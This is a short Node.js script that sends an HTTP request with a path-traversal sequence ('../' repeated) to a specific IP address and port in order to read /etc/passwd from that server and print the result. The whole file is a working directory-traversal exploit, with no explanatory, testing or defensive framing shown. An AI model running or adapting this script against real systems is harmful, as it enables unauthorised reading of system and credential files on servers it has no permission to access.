const http = require('http');

http.get('http://194.39.186.21:8082/../../../../../../etc/passwd', resp => {
    let data = '';
    resp.on('data', chunk => data += chunk);
    resp.on('end', () => console.log(data));
}).on('error', err => console.log(`Error: ${err.message}`));
